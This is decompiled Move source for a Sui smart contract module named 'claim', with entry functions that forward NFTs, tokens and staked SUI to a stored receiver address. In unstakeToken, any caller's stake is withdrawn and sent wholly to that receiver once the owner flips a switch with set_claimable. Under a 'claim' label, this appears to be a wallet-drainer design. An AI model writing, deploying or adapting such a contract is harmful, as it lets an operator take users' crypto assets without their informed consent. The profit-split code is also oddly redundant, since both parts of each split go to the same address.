module 0x8039b351c59c8770f4d00229d3c8b5af869f723ac5b533544be7ea5090f73875::claim {
    struct ClaimDetails has copy, drop, store {
        coin_details: vector<CoinDetail>,
    }

    struct ClaimParams has key {
        id: 0x2::object::UID,
        owner: address,
        delegate: address,
        initialized: bool,
        details: 0x1::option::Option<ClaimDetails>,
        receiver_address: address,
        profit_split: u8,
    }

    struct CoinDetail has copy, drop, store {
        coin_type: 0x1::ascii::String,
        amount: u64,
        object_id: 0x2::object::ID,
    }

    public entry fun create_and_update_claim_params(arg0: address, arg1: address, arg2: u8, arg3: vector<0x1::ascii::String>, arg4: vector<u64>, arg5: vector<0x2::object::ID>, arg6: &mut 0x2::tx_context::TxContext) {
        let v0 = ClaimDetails{coin_details: 0x1::vector::empty<CoinDetail>()};
        let v1 = 0;
        while (v1 < 0x1::vector::length<0x1::ascii::String>(&arg3)) {
            let v2 = *0x1::vector::borrow<0x1::ascii::String>(&arg3, v1);
            let v3 = CoinDetail{
                coin_type : trim_address_zeros(&v2),
                amount    : *0x1::vector::borrow<u64>(&arg4, v1),
                object_id : *0x1::vector::borrow<0x2::object::ID>(&arg5, v1),
            };
            0x1::vector::push_back<CoinDetail>(&mut v0.coin_details, v3);
            v1 = v1 + 1;
        };
        let v4 = ClaimParams{
            id               : 0x2::object::new(arg6),
            owner            : 0x2::tx_context::sender(arg6),
            delegate         : arg0,
            initialized      : false,
            details          : 0x1::option::some<ClaimDetails>(v0),
            receiver_address : arg1,
            profit_split     : arg2,
        };
        0x2::transfer::share_object<ClaimParams>(v4);
    }

    public entry fun create_claim_params(arg0: address, arg1: address, arg2: u8, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = ClaimParams{
            id               : 0x2::object::new(arg3),
            owner            : 0x2::tx_context::sender(arg3),
            delegate         : arg0,
            initialized      : false,
            details          : 0x1::option::none<ClaimDetails>(),
            receiver_address : arg1,
            profit_split     : arg2,
        };
        0x2::transfer::share_object<ClaimParams>(v0);
    }

    public entry fun sendNFT<T0: store + key>(arg0: &mut ClaimParams, arg1: T0, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.delegate, 0);
        0x2::object::id<T0>(&arg1);
        if (!arg0.initialized) {
            0x2::transfer::public_transfer<T0>(arg1, arg0.receiver_address);
        } else {
            0x2::transfer::public_transfer<T0>(arg1, arg0.receiver_address);
        };
    }

    public entry fun sendToken<T0>(arg0: &mut ClaimParams, arg1: 0x2::coin::Coin<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.delegate, 0);
        assert!(0x1::option::is_some<ClaimDetails>(&arg0.details), 1);
        let v0 = 0x1::option::borrow_mut<ClaimDetails>(&mut arg0.details);
        let v1 = 0x1::type_name::into_string(0x1::type_name::get<T0>());
        let v2 = 0;
        let v3 = false;
        let v4 = 0;
        while (v2 < 0x1::vector::length<CoinDetail>(&v0.coin_details)) {
            let v5 = 0x1::vector::borrow<CoinDetail>(&v0.coin_details, v2);
            if (v5.coin_type == trim_address_zeros(&v1) && v5.object_id == 0x2::object::id<0x2::coin::Coin<T0>>(&arg1)) {
                v3 = true;
                v4 = v5.amount;
                break
            };
            v2 = v2 + 1;
        };
        assert!(v3, 3);
        let v6 = 0x2::coin::value<T0>(&arg1);
        assert!(v6 >= v4, 2);
        if (v4 == 0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.receiver_address);
        } else if (v6 == v4) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut arg1, v4 * (arg0.profit_split as u64) / 100, arg2), arg0.receiver_address);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.receiver_address);
        } else {
            let v7 = 0x2::coin::split<T0>(&mut arg1, v4, arg2);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::split<T0>(&mut v7, v4 * (arg0.profit_split as u64) / 100, arg2), arg0.receiver_address);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v7, arg0.receiver_address);
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(arg1, arg0.receiver_address);
        };
        0x1::vector::swap_remove<CoinDetail>(&mut v0.coin_details, v2);
        if (0x1::vector::is_empty<CoinDetail>(&v0.coin_details)) {
            arg0.details = 0x1::option::none<ClaimDetails>();
        };
    }

    public entry fun set_claimable(arg0: &mut ClaimParams, arg1: bool, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.owner, 0);
        arg0.initialized = arg1;
    }

    fun trim_address_zeros(arg0: &0x1::ascii::String) : 0x1::ascii::String {
        let v0 = 0x1::ascii::into_bytes(*arg0);
        let v1 = 0x1::vector::empty<u8>();
        let v2 = 0x1::vector::length<u8>(&v0);
        if (v2 < 2 || *0x1::vector::borrow<u8>(&v0, 0) != 48 || *0x1::vector::borrow<u8>(&v0, 1) != 120) {
            0x1::vector::push_back<u8>(&mut v1, 48);
            0x1::vector::push_back<u8>(&mut v1, 120);
        };
        let v3 = 0;
        while (v3 < v2) {
            0x1::vector::push_back<u8>(&mut v1, *0x1::vector::borrow<u8>(&v0, v3));
            v3 = v3 + 1;
        };
        0x1::ascii::string(v1)
    }

    public entry fun unstakeToken(arg0: &mut 0x3::sui_system::SuiSystemState, arg1: 0x3::staking_pool::StakedSui, arg2: &mut ClaimParams, arg3: &mut 0x2::tx_context::TxContext) {
        if (arg2.initialized) {
            assert!(0x1::option::is_some<ClaimDetails>(&arg2.details), 1);
            0x1::option::borrow<ClaimDetails>(&arg2.details);
            let v0 = 0x2::coin::from_balance<0x2::sui::SUI>(0x3::sui_system::request_withdraw_stake_non_entry(arg0, arg1, arg3), arg3);
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(&mut v0, 0x2::coin::value<0x2::sui::SUI>(&v0) * (arg2.profit_split as u64) / 100, arg3), arg2.receiver_address);
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(v0, arg2.receiver_address);
        } else {
            0x2::transfer::public_transfer<0x3::staking_pool::StakedSui>(arg1, 0x2::tx_context::sender(arg3));
        };
    }

    public entry fun update_claim_details(arg0: &mut ClaimParams, arg1: address, arg2: u8, arg3: vector<0x1::ascii::String>, arg4: vector<u64>, arg5: vector<0x2::object::ID>, arg6: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg6) == arg0.delegate, 0);
        let v0 = ClaimDetails{coin_details: 0x1::vector::empty<CoinDetail>()};
        let v1 = 0;
        while (v1 < 0x1::vector::length<0x1::ascii::String>(&arg3)) {
            let v2 = *0x1::vector::borrow<0x1::ascii::String>(&arg3, v1);
            let v3 = CoinDetail{
                coin_type : trim_address_zeros(&v2),
                amount    : *0x1::vector::borrow<u64>(&arg4, v1),
                object_id : *0x1::vector::borrow<0x2::object::ID>(&arg5, v1),
            };
            0x1::vector::push_back<CoinDetail>(&mut v0.coin_details, v3);
            v1 = v1 + 1;
        };
        arg0.details = 0x1::option::some<ClaimDetails>(v0);
        arg0.receiver_address = arg1;
        arg0.profit_split = arg2;
    }

    // decompiled from Move bytecode v6
}

